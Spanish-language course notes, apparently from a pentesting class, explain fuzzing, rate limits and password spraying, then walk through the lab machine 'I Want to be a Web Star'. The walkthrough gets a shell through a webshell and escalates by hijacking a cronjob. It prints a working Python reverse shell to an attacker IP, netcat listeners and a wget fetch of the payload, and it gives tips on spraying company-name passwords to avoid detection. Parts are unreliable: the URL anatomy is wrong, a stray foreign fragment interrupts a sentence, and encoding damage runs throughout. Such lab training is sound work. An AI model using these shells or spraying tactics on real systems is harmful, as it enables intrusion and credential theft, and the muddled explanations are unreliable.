
> [!info] Ficha tÃ©cnica
> **Instructor:** Carlos GÃ³mez Pintado (el coletas) Â· **Fecha:** 02/07/2026
> **MÃ³dulo:** AuditorÃ­a web Â· Fuzzing Â· Directory Listing Â· Rate Limits Â· Escalada por Script Hijacking
> **Entorno:** Kali Linux Â· MÃ¡quina "I Want to be a Web Star" de HackerLab
> **Participantes destacados:** Chema, Asier, Mariana, John, Manu, Oscar, Juan Carlos, Confil, Pablo, Cristian

> [!tip] CÃ³mo leer estos apuntes
> Esta sesiÃ³n tiene dos bloques bien diferenciados: **conceptual** (diferencia entre fuerza bruta, password spraying, directory listing y fuzzing, con especial atenciÃ³n a rate limits) y **prÃ¡ctico** (resoluciÃ³n completa de la mÃ¡quina "I Want to be a Web Star" con escalada por script hijacking mediante cronjob). Es la sesiÃ³n donde se consolida la metodologÃ­a de pentesting web completa: enumeraciÃ³n â†’ explotaciÃ³n â†’ escalada.

---

## â‘  AnatomÃ­a de una URL â€” anÃ¡lisis sintÃ¡ctico

Carlos repasa la estructura de una URL como si fuera un anÃ¡lisis sintÃ¡ctico de Lengua:

```
https://www.amazon.es/admin/search.php?id=123&cat=libros
|____| |__________||___________||___________| |_________|
 1 2 3 4 5

1. Protocolo (https) + subprotocolo (TCP/IP)
2. Dominio (amazon.es) + TLD (.es = EspaÃ±a, .com = global)
3. Directorio (/admin) â€” el "sujeto de la oraciÃ³n"
4. ParÃ¡metro (search.php) â€” despuÃ©s del interrogante
5. Variables (id=123&cat=libros) â€” pares clave=valor separados por &
```

| Componente | Ejemplo | DescripciÃ³n |
|------------|---------|-------------|
| **Protocolo** | `https://` | TCP/IP seguro. TambiÃ©n puede ser FTP, SSH, SMB |
| **Dominio** | `amazon.es` | Procedencia (.es EspaÃ±a, .mx MÃ©xico, .com global) |
| **Directorio** | `/admin` | Carpeta en el servidor â€” el "sujeto" |
| **Interrogante** | `?` | Separa directorio de parÃ¡metros |
| **ParÃ¡metro** | `search.php` | FunciÃ³n/endpoints que recibe variables |
| **Variables** | `id=123&cat=libros` | Pares clave=valor, separados por `&` |

> [!important] La regla de los `&`
> Cuando hay mÃºltiples parÃ¡metros, se separan con `&` (ampersand). **NO se pone interrogante despuÃ©s del `&`**. Ejemplo: `?param1=valor1&param2=valor2`. El interrogante solo aparece **una vez**, al principio.

> [!note] La analogÃ­a de Carlos
> "Cada uno de vosotros es un directorio. Mariana tiene sus cosas, Charchas las suyas. Si yo le pregunto a Mariana y me responde, sÃ© que existe (200). Si le pregunto a Asier y no me responde, no existe (404)."

---

## â‘¡ Fuerza bruta vs. Password spraying vs. Directory listing

### Â¿Por quÃ© son cosas distintas?

La distinciÃ³n no es acadÃ©mica â€” tiene consecuencias directas sobre si el sistema levanta alertas o bloquea la IP.

### Rate limit â€” el concepto clave

```
Rate limit = N intentos / unidad de tiempo

Ejemplo tÃ­pico: 3 intentos cada 5 minutos por usuario
 = 1 intento cada 100 segundos (1,5 minutos)
```

> [!important] Â¿QuÃ© activa el rate limit?
> El bloqueo se activa por **intentos repetidos sobre el mismo endpoint**, no por volumen total de peticiones. Cambiar de endpoint entre cada intento es lo que hace que ciertas tÃ©cnicas no levanten alarmas.

### Comparativa de las tres tÃ©cnicas

| TÃ©cnica | QuÃ© hace | Â¿Activa rate limit? | Â¿Por quÃ©? |
|---------|----------|---------------------|-----------|
| **Fuerza bruta** | MÃºltiples valores contra el **mismo endpoint** | **SÃ** | Golpea el mismo punto una y otra vez |
| **Password spraying** | **Una misma contraseÃ±a** contra **todos los usuarios** | **NO** | Cada usuario es un endpoint diferente |
| **Directory listing** | Prueba **diferentes directorios** | **NO** | Cada directorio es un endpoint diferente |

### Fuerza bruta â€” el problema

```
Fuerza bruta en /wp-login.php para usuario "admin":

admin:123 â†’ 500
admin:456 â†’ 500
admin:789 â†’ 500
... (repitiendo contra el mismo punto)
â†’ RATE LIMIT â†’ BLOQUEO
```

AdemÃ¡s, el espacio de bÃºsqueda es **exponencial**:

| Longitud | Caracteres | Combinaciones | Tiempo estimado |
|----------|------------|---------------|-----------------|
| 4 | Solo nÃºmeros | 10.000 | Segundos |
| 6 | AlfanumÃ©ricos | ~568 millones | Minutos |
| 8 | AlfanumÃ©ricos | ~218 billones | DÃ­as |
| 10 | AlfanumÃ©ricos | ~839 cuatrillones | AÃ±os |
| 14 | AlfanumÃ©ricos + especiales | ~63 quintillones | **200+ millones de aÃ±os** |

> [!warning] La trampa de la exponencialidad
> "Antes de llegar a 14 caracteres, tenÃ©s que probar TODAS las combinaciones de 1, 2, 3... 13 caracteres. Todo es sumatorio."

### Password spraying â€” la alternativa inteligente

```
ContraseÃ±a "empresa2026" contra TODOS los usuarios:

MarÃ­a â†’ 200 âœ“
Charchas â†’ 404
Oscar â†’ 200 âœ“
John â†’ 404
...

Siguiente tanda: "empresa2026!"
... (y asÃ­ sucesivamente)
```

> [!note] Ejemplo real de Carlos
> "Llego a una empresa de 700 abogados. Pruebo `abogadosplus2026` contra todos. Si al menos 100 usuarios me dan positivo, estÃ¡ normal. Luego pruebo `abogadosplus2026!`, `abogadosplus2025`, `abogadosplus2025!`. Con esas cuatro combinaciones, el 25% me ha dado resultado positivo."

**Â¿Por quÃ© funciona?** Porque "la gente es imbÃ©cil y la contraseÃ±a mÃ¡s utilizada en tu puesto de trabajo es el nombre de la empresa con el nÃºmero."

### Directory listing â€” Â¿por quÃ© no es fuerza bruta?

```
Directorios probados:
/admin â†’ 200 âœ“
/uploads â†’ 200 âœ“
/config â†’ 404
/dev â†’ 200 âœ“
/images â†’ 200 âœ“
```

Cada directorio es un **endpoint diferente**. El comportamiento normal de un navegador ya genera decenas de peticiones a rutas diferentes al cargar cualquier pÃ¡gina. Por eso el sistema no lo detecta como ataque.

### La analogÃ­a del SIEM

> "Si yo soy muy pesado y pregunto 'Â¿me dejÃ¡s un euro?' una y otra vez al mismo, a la dÃ©cima me detecta el SIEM. Pero si le pregunto uno a Asier, otro a Chema, otro a Oscar... cuando vuelvo a Asier, ya ha pasado tiempo y no me reconoce."

---

## â‘¢ Fuzzing â€” la tÃ©cnica mÃ¡s versÃ¡til

### Â¿QuÃ© es fuzzing?

Fuzzing = **generalizaciÃ³n del directory listing**. Permite colocar el payload en **cualquier posiciÃ³n** de la URL.

### Las 4 posiciones del fuzzing

```
1. Subdominios:
 [FUZZ].amazon.es â†’ admin.amazon.es, dev.amazon.es, api.amazon.es

2. Directorios:
 amazon.es/[FUZZ] â†’ /admin, /uploads, /config

3. ParÃ¡metros:
 amazon.es/api?[FUZZ]=valor â†’ ?id=valor, ?page=valor, ?search=valor

4. Variables:
 amazon.es/search?q=[FUZZ] â†’ ?q=test, ?q=1, ?q=admin
```

> [!important] La ventaja del fuzzing
> "El fuzzing recorre las dos mejores cosas de la fuerza bruta y del directory listing:å®ƒå®ƒ combina la iteraciÃ³n sistemÃ¡tica con la capacidad de descubrir estructuras ocultas."

### Herramientas de fuzzing

| Herramienta | Uso principal | Nota |
|-------------|---------------|------|
| **ffuf** | Fuzzing general (directorios, parÃ¡metros) | La de referencia |
| **x8** | EnumeraciÃ³n de parÃ¡metros ocultos | EspecÃ­fico para parÃ¡metros |
| **dirsearch** | Directorios (tiene medium-low propio) | Complementario a gobuster |
| **gobuster** | Directorios | RÃ¡pido, popular |
| **feroxbuster** | Directorios + ficheros con extensiones (`-x`) | El mÃ¡s versÃ¡til |

> [!warning] Docker falla
> "Docker es una autÃ©ntica mierda. Veis por quÃ© os digo que no utilicÃ©is Docker? Porque no funciona para nada." La alternativa es compilar con **Cargo** (Rust) o crear el fuzzer en Python.

### Diccionarios importantes

| Diccionario | Uso | Ruta |
|-------------|-----|------|
| `common.txt` | Directorios web | `/usr/share/wordlists/dirb/common.txt` |
| `big.txt` | Directorios ampliado | `/usr/share/wordlists/dirb/big.txt` |
| `rockyou.txt` | **ContraseÃ±as** (NO para directorios) | `/usr/share/wordlists/rockyou.txt` |
| `directory-list-2.3-medium.txt` | Directorios (SecLists) | `/usr/share/wordlists/dirb/` |

> [!important] Regla OSCP
> RockYou es de contraseÃ±as, **NO sirve para directorios**. Los wordlists de directorios son para fuzzing web, no para brute force SSH.

---

## â‘£ MetodologÃ­a de pentesting web â€” la metodologÃ­a completa

Carlos repasa el flujo completo de un pentesting web:

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. ENUMERACIÃ“N â”‚
â”‚ â†’ Nmap (puertos + servicios) â”‚
â”‚ â†’ Puerto 80/443 â†’ Directory listing â”‚
â”‚ â†’ WordPress â†’ WPScan / Drupal â†’ Drupascan â”‚
â”‚ â†’ Frameworks especÃ­ficos â†’ sus herramientas â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 2. EXPLORACIÃ“N (conocer la web) â”‚
â”‚ â†’ Clic en sitios, ver funcionalidades â”‚
â”‚ â†’ Wappalyzer (tecnologÃ­as) â”‚
â”‚ â†’ CÃ³digo fuente (F12) â”‚
â”‚ â†’ Formularios â†’ potencial SQL Injection â”‚
â”‚ â†’ Blogs/foros â†’ potencial XSS â”‚
â”‚ â†’ PDFs â†’ potencial XXE â”‚
â”‚ â†’ Sin fetch origin â†’ potencial SRF â”‚
â”‚ â†’ PHP antiguo â†’ CVE conocido â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 3. EXPLORACIÃ“N PROFUNDA â”‚
â”‚ â†’ Fuzzing (si el directory listing no revela nada) â”‚
â”‚ â†’ ParÃ¡metros ocultos (x8) â”‚
â”‚ â†’ Subdominios ocultos â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 4. EXPLOTACIÃ“N â”‚
â”‚ â†’ Metasploit, reverse shells, etc. â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 5. ESCALADA â”‚
â”‚ â†’ SUID, cronjobs, sudo -l, etc. â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 6. PERSISTENCIA â”‚
â”‚ â†’ Claves SSH, usuarios, backdoors â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ 7. REPORTE â”‚
â”‚ â†’ Documentar todo â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

â†’

> [!note] La analogÃ­a de la discoteca
> "Llegas a la discoteca. No le metes boca directo (explotar). Primero la conoces: Â¿quÃ© menÃº tiene? Â¿Tiene buscador? Â¿Hace post? Tiene formulario de registro â†’ potencial SQL. Tiene blog â†’ potencial XSS. Tiene descarga de PDF â†’ posible XXE. Tiene versiÃ³n antigua de PHP â†’ CVE. Ya la conocÃ©s, ya sabÃ©s que le gusta el tequila. Vamos al de tequila, vamos asegurando."

â†’

> [!warning] El WAF es el portero
> "Si te pasas de pesado, te echan. Tienes que conseguir la seducciÃ³n sin que te eche el portero."

---

## â‘¤ MÃ¡quina "I Want to be a Web Star" â€” Reconocimiento

### Ficha tÃ©cnica

| Dato | Valor |
|------|-------|
| **MÃ¡quina** | I Want to be a Web Star (HackerLab) |
| **Puertos** | 22 (SSH), 80 (HTTP Apache 2.4.18 Ubuntu) |
| **TecnologÃ­a** | PHP, Apache, Ubuntu |
| **Vector inicial** | Webshell en `/dev` |
| **Escalada** | Script hijacking por cronjob |

### Paso 1: Nmap

```bash
nmap -sC -sV -p- <IP> --min-rate 1500
```

**Resultado:**

| Puerto | Servicio | Nota |
|--------|----------|------|
| 22 | SSH | Necesita credenciales â€” no brute force todavÃ­a |
| 80 | HTTP Apache 2.4.18 | Ubuntu â€” vulnerable segÃºn Wappalyzer |

> [!note] SSH primero, pero no directo
> "Â¿Por quÃ© no vamos directo al 22? Porque SSH necesitarÃ­amos credenciales. Como no tenemos, lo descartamos de momento."

### Paso 2: ExploraciÃ³n con Wappalyzer

```
TecnologÃ­as detectadas:
- Apache 2.4.18 (Ubuntu) â†’ CVE conocidos
- PHP â†’ funciona en Linux (no en Windows/IIS)
- jQuery â†’ "en mi vida he vulnerado un jQuery"
```

### Paso 3: Directory listing con dirsearch

```bash
dirsearch -u <IP> -e php,py,html,txt
```

**Resultado:**

| Directorio/Fichero | Nota |
|--------------------|------|
| `/php` | Funcionalidad de envÃ­o de mail |
| `/js` | Javascripts (mismos que en cÃ³digo fuente) |
| `/dev` | **Ficheros PHP â€” objetivo principal** |
| `/uploads` | Posible ruta de subida de ficheros |
| `/images` | ImÃ¡genes |
| `/config.php` | 0 bytes â€” se ejecuta en backend |
| `/about.html` | PÃ¡gina con autor: **Jen Marshall** â†’ posible usuario |
| `/contact.html` | Formulario sin funcionalidad real |

> [!important] Hallazgo clave: /dev
> En `/dev` se encuentran dos ficheros PHP. Al abrir uno en el navegador, se muestra una **shell web funcional**. El cÃ³digo fuente del PHP Bash en GitHub indica que fue "desarrollado y probado en este servidor".

### Paso 4: CÃ³digo fuente â€” GitHub como pista

El cÃ³digo fuente de la web contiene un enlace a un repositorio de GitHub con un comentario:

> "This PHP Bash helps many pentesters and I've been testing on multiple servers... actually developed on this server."

> [!note] La informaciÃ³n crÃ­tica
> "El servidor tiene instalada una herramienta concreta cuyo cÃ³digo fuente estÃ¡ disponible pÃºblicamente. Esto es informaciÃ³n crÃ­tica."

### Paso 5: AnÃ¡lisis de la pÃ¡gina About

```html
<!-- CÃ³digo fuente de about.html -->
Autor: Jen Marshall
```

**Posibles usuarios del sistema:**
- `jenmarshall`
- `jmarshall`
- `jenm`
- `jen`

> [!important] Un autor es un usuario
> "Un autor en un blog es usuario de ese blog. Yo ya potencialmente tengo usuario."

### Paso 6: Formulario de contacto â€” no funciona

```html
<!-- BotÃ³n Send no tiene funcionalidad -->
<a href="#">Send</a> <!-- No apunta a ningÃºn lado -->
```

> "Si pulsamos Send y nos quedamos sobre Ã©l, en la esquina inferior izquierda no aparece nada. No nos lleva a ningÃºn lado."

---

## â‘¥ ExplotaciÃ³n â€” Webshell a Reverse Shell

### Paso 1: Shell web funcional

Al acceder a `/dev/bash.php`, se muestra una shell web:

```
$ whoami
www-data

$ ls
/var/www/html
```

> [!important] Shell real, no de MrRobot
> "El cÃ³digo vulnerable de la herramienta en sÃ­ estÃ¡ conectado directamente con el servidor. Los comandos que estamos inyectando aquÃ­ son contra el servidor, es una shell real."

### Paso 2: Verificar herramientas disponibles

```bash
# Â¿Tiene Netcat?
$ ls /bin | grep nc
nc

# Â¿Tiene Python?
$ python --version
Python 2.7.x

# Â¿QuÃ© versiÃ³n de PHP?
$ php -v
```

### Paso 3: Generar reverse shell con Python

```python
# Reverse shell en Python 2 (de revshells.com)
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.195", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```

### Paso 4: Escuchar con Netcat

```bash
# En la mÃ¡quina atacante
nc -lvnp 4444
```

### Paso 5: Ejecutar reverse shell desde la webshell

Copiar el payload Python y pegarlo en la shell web. Netcat recibe la conexiÃ³n:

```
Connection from 10.0.2.x
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!important] Compromiso inicial
> Shell interactiva como `www-data`. Ahora toca escalar privilegios.

---

## â‘¦ Escalada de privilegios â€” Script Hijacking por Cronjob

### Paso 1: Los 5 comandos iniciales

```bash
whoami # www-data
pwd # /var/www/html
uname -a # VersiÃ³n del kernel
sudo -l # Permisos de sudo
find / -perm -4000 -type f 2>/dev/null # Buscar SUIDs
```

### Paso 2: sudo -l â€” el hallazgo

```bash
$ sudo -l
User www-data may run the following commands:
 (scriptmanager) NOPASSWD: /bin/bash
```

> [!important] Movimiento lateral
> `www-data` puede ejecutar comandos como `scriptmanager` **sin contraseÃ±a**.

### Paso 3: Cambiar a scriptmanager

```bash
sudo -u scriptmanager -i
# -i = interactive (conseguir una bash)
```

> [!note] La regla de Carlos
> "Si listamos todos los comandos que podemos utilizar con sudo, y nos dicen que podemos cambiarnos a scriptmanager, tendremos que hacerlo utilizando sudo."

### Paso 4: Explorar /home/scriptmanager

```bash
$ pwd
/home/scriptmanager

$ ls -la
# No hay nada relevante
```

### Paso 5: Buscar el directorio /scripts

```bash
$ cd /scripts
$ ls
test.py test.txt

$ ls -la
-rw-r--r-- 1 root root 12 Mar 2 10:30 test.txt
-rw-r--r-- 1 scriptmanager scriptmanager 85 Mar 2 10:30 test.py
```

| Fichero | Propietario | Permisos | Contenido |
|---------|-------------|----------|-----------|
| `test.txt` | **root** | Lectura para todos | "testing 123" |
| `test.py` | **scriptmanager** | Lectura/Escritura | Abre test.txt y escribe "testing 123" |

### Paso 6: Entender la cadena de ejecuciÃ³n

```
test.py (scriptmanager) â†’ escribe en â†’ test.txt (root)
 â†‘ â†‘
 Nosotros podemos Root ejecuta esto
 modificar este periÃ³dicamente (cron)
```

> [!important] La clave de la escalada
> `test.txt` es propiedad de root, pero `test.py` lo puede modificar porque **quien ejecuta `test.py` es root** a travÃ©s de un cronjob. Esto se confirma observando que la fecha de modificaciÃ³n de `test.txt` cambia periÃ³dicamente aunque nadie lo haya modificado manualmente.

> [!note] La metÃ¡fora de Carlos
> "Es como dejar las llaves del coche en el bolsillo del abrigo que cuelga en el recibidor. El coche es de root, pero cualquiera que entre al recibidor puede coger las llaves."

### Paso 7: Verificar el cronjob

```bash
# No podemos ver el crontab de root directamente
$ crontab -l
# (vacÃ­o para scriptmanager)

# Pero la evidencia estÃ¡ en test.txt:
# Si su fecha de modificaciÃ³n cambia sin que nosotros lo hagamos,
# es que hay un cron que ejecuta test.py como root
```

> [!important] CÃ³mo detectar un cron sin verlo
> "La forma de ver si hay un cron es fijarnos en la fecha de modificaciÃ³n del fichero. Si cuando vamos actualizando y listando en algÃºn momento se modifica, es que hay algo que lo ha modificado."

### Paso 8: Modificar test.py con reverse shell

```bash
# En la mÃ¡quina atacante, crear test.py con reverse shell:
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.195", 4440))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])
```

```bash
# Montar servidor HTTP para transferir el fichero
python3 -m http.server 8000
```

### Paso 9: Descargar y ejecutar

```bash
# En la mÃ¡quina vÃ­ctima (como scriptmanager):
$ rm test.py
$ wget http://10.10.14.195:8000/test.py
$ cat test.py # Verificar contenido
$ chmod +x test.py
```

### Paso 10: Escuchar y esperar

```bash
# En la mÃ¡quina atacante:
nc -lvnp 4440

# Esperar a que el cronjob ejecute test.py como root...
# (puede tardar unos minutos)
```

```
Connection from 10.0.2.x
$ whoami
root
$ cat /root/root.txt
FLAG{...}
```

> [!important] Resultado
> Shell de **root** obtenida. La vulnerabilidad no estÃ¡ en el sistema operativo sino en la **configuraciÃ³n**: un fichero que root ejecuta pero que otros usuarios pueden escribir.

---

## â‘§ Resumen: Cadena de explotaciÃ³n completa

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. Nmap â†’ Puertos 22 (SSH) y 80 (HTTP) â”‚
â”‚ 2. Wappalyzer â†’ Apache 2.4.18 Ubuntu, PHP â”‚
â”‚ 3. dirsearch â†’ /dev, /php, /js, /uploads, /config.php â”‚
â”‚ 4. CÃ³digo fuente â†’ GitHub con PHP Bash desarrollado aquÃ­ â”‚
â”‚ 5. About â†’ Autor: Jen Marshall â†’ posible usuario â”‚
â”‚ 6. /dev/bash.php â†’ Webshell funcional â”‚
â”‚ 7. whoami â†’ www-data â”‚
â”‚ 8. sudo -l â†’ (scriptmanager) NOPASSWD â”‚
â”‚ 9. sudo -u scriptmanager -i â†’ acceso como scriptmanager â”‚
â”‚ 10. /scripts â†’ test.py (scriptmanager) + test.txt (root) â”‚
â”‚ 11. AnÃ¡lisis â†’ cron ejecuta test.py como root â”‚
â”‚ 12. Modificar test.py â†’ reverse shell â”‚
â”‚ 13. Netcat â†’ shell de root â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

| Fase | TÃ©cnica | Herramientas |
|------|---------|--------------|
| Reconocimiento | Nmap, Wappalyzer | Terminal, Navegador |
| EnumeraciÃ³n web | dirsearch, cÃ³digo fuente, About | Terminal, DevTools |
| ExplotaciÃ³n | Webshell â†’ reverse shell | Python, Netcat |
| Movimiento lateral | sudo -l â†’ scriptmanager | sudo |
| Escalada | Script hijacking por cronjob | Python, wget |

---

## â‘¨ Conceptos clave para recordar

| Concepto | DefiniciÃ³n |
|----------|------------|
| **Rate limit** | N intentos / unidad de tiempo. Se activa por intentos repetidos sobre el **mismo endpoint** |
| **Fuerza bruta** | MÃºltiples valores contra el **mismo endpoint** â†’ activa rate limit |
| **Password spraying** | Una contraseÃ±a contra **todos los usuarios** â†’ NO activa rate limit |
| **Directory listing** | Prueba **diferentes directorios** â†’ cada uno es endpoint diferente â†’ NO activa rate limit |
| **Fuzzing** | GeneralizaciÃ³n del directory listing. Payload en cualquier posiciÃ³n de la URL |
| **Script hijacking** | Modificar un fichero que otro usuario (con mÃ¡s privilegios) ejecuta periÃ³dicamente |
| **Cronjob** | Tarea programada que ejecuta un fichero periÃ³dicamente, normalmente como root |
| **Webshell** | Shell web que permite ejecutar comandos en el servidor desde el navegador |

---

## â‘© Notas de clase

- **Chema** preguntÃ³ mucho sobre la diferencia entre fuerza bruta y directory listing (buena pregunta).
- **Asier** confirmÃ³ que el directory listing no activa rate limit porque cada directorio es un endpoint diferente.
- **Manu** preguntÃ³ sobre la metodologÃ­a de pentesting â€” Carlos la explicÃ³ con la analogÃ­a de la discoteca.
- **Oscar** preguntÃ³ si el directory listing se considera fuerza bruta â€” Carlos confirmÃ³ que no.
- **John** hizo un comentario sobre el pueblo judÃ­o que generÃ³ controversia.
- **Juan Carlos** preguntÃ³ sobre WPScan como herramienta de directory listing â€” Carlos dijo que es demasiado nicho.
- **Mariana** participÃ³ activamente en la discusiÃ³n sobre rate limits.
- **Cristian** explicÃ³ por quÃ© un XSS no sirve en un CTF con un solo usuario.
- Se mencionÃ³ que **Hack the Box** tiene una cuenta con ~100 mÃ¡quinas hechas.
- Se hablÃ³ de **insane machines** que pueden tardar semanas o meses.
- **Carlos** mencionÃ³ que en una insane tuvo que encontrar el exploit en un foro de la deep web.
- Se mencionÃ³ que el viernes viene **Dani** para repaso.
- La clase terminÃ³ 20 minutos antes para que pudieran ver el partido de EspaÃ±a vs. Francia.
- **Chema** confirmÃ³ que la mÃ¡quina se resolviÃ³ con un cronjob que ejecutaba test.py como root.

---

## â‘ª Comandos de la sesiÃ³n

```bash
# === DESCUBRIMIENTO ===
nmap -sC -sV -p- <IP> --min-rate 1500

# === ENUMERACIÃ“N WEB ===
dirsearch -u <IP> -e php,py,html,txt
gobuster dir -u <IP> -w /usr/share/wordlists/dirb/common.txt

# === TECNOLOGÃAS ===
# Wappalyzer (extensiÃ³n del navegador)
# Ctrl+U â†’ ver cÃ³digo fuente
# F12 â†’ Network â†’ Headers â†’ Accept

# === EXPLORACIÃ“N DE PÃGINA ===
# /dev/bash.php â†’ Webshell
# /about.html â†’ Autor: Jen Marshall
# /contact.html â†’ Formulario sin funcionalidad
# /config.php â†’ 0 bytes (se ejecuta en backend)

# === COMPROMISO INICIAL ===
whoami
ls
python --version
ls /bin | grep nc

# === REVERSE SHELL (Python 2) ===
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.195", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])

# === ESCUCHA ===
nc -lvnp 4444

# === MOVIMIENTO LATERAL ===
sudo -l
sudo -u scriptmanager -i

# === ANÃLISIS DE PERMISOS ===
ls -la /scripts
cat test.py
cat test.txt
file test.txt

# === ESCALADA ===
# Crear test.py con reverse shell en Python
# Transferir con wget desde servidor HTTP
python3 -m http.server 8000
wget http://<IP>:8000/test.py

# === ESCUCHA ROOT ===
nc -lvnp 4440
# Esperar cronjob...
```

---

## â‘« ConexiÃ³n con otras sesiones

> [!note] Sesiones relacionadas
> - **SesiÃ³n anterior** (01/07): IntroducciÃ³n a reconocimiento web y directory listing
> - **SesiÃ³n anterior** (30/06): Primeras mÃ¡quinas y fundamentos de pentesting
> - **SesiÃ³n siguiente** (03/07): ContinuaciÃ³n con mÃ¡quinas y escaneo de vulnerabilidades
> - **MÃ¡quina Rockstar** (apunte anterior): Path Traversal â†’ LFI â†’ /etc/passwd
> - **MÃ¡quina Banco** (apunte anterior): Path Traversal â†’ LFI â†’ Escalada por SUID

---

> [!tip] La lecciÃ³n mÃ¡s importante de esta sesiÃ³n
> "Siempre hay que hacer una enumeraciÃ³n mÃ­nima antes de explotar. Si no lo haces, te vas a hacer esperar tÃº antes que la pÃ¡gina caiga. Primero conocemos, despuÃ©s conectamos, y ya despuÃ©s explotamos."
> â€” Carlos GÃ³mez Pintado

â†’

â†’

â†’
